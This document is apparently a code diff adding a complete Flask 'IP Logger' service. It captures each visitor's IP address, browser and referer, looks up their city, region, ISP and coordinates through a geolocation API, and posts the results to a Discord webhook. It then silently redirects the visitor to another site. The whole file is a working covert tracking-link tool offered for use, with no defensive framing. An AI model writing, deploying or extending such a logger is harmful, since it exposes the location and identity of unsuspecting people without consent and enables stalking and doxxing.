@@ -1,0 +1,66 @@
+import requests
+import json
+from flask import Flask, request
+from datetime import datetime
+
+app = Flask(__name__)
+
+@app.route('/')
+def log_ip():
+    # Get visitor information
+    ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
+    user_agent = request.headers.get('User-Agent')
+    accept_language = request.headers.get('Accept-Language')
+    referer = request.headers.get('Referer')
+    
+    # Get additional info from IP API
+    try:
+        response = requests.get(f'http://ip-api.com/json/{ip}')
+        ip_data = response.json()
+    except:
+        ip_data = {}
+    
+    # Create comprehensive data payload
+    data = {
+        'timestamp': datetime.now().isoformat(),
+        'ip': ip,
+        'user_agent': user_agent,
+        'language': accept_language,
+        'referer': referer,
+        'location': {
+            'country': ip_data.get('country'),
+            'region': ip_data.get('regionName'),
+            'city': ip_data.get('city'),
+            'lat': ip_data.get('lat'),
+            'lon': ip_data.get('lon'),
+            'isp': ip_data.get('isp'),
+            'org': ip_data.get('org'),
+            'as': ip_data.get('as')
+        },
+        'connection': {
+            'timezone': ip_data.get('timezone'),
+            'mobile': request.headers.get('User-Agent').lower().find('mobi') > -1
+        }
+    }
+    
+    # Send to Discord webhook
+    webhook_url = "YOUR_WEBHOOK_URL_HERE"
+    embed = {
+        "title": "IP Logger Results",
+        "description": f"New visitor captured at {data['timestamp']}",
+        "color": 16711680,
+        "fields": [
+            {"name": "IP Address", "value": data['ip'], "inline": True},
+            {"name": "Location", "value": f"{data['location']['city']}, {data['location']['region']}, {data['location']['country']}", "inline": True},
+            {"name": "ISP", "value": data['location']['isp'], "inline": True},
+            {"name": "Browser", "value": data['user_agent'][:100], "inline": False}
+        ]
+    }
+    
+    requests.post(webhook_url, json={"embeds": [embed]})
+    
+    # Redirect to original URL
+    return "Redirecting...", 302, {'Location': 'https://example.com'}
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=80)
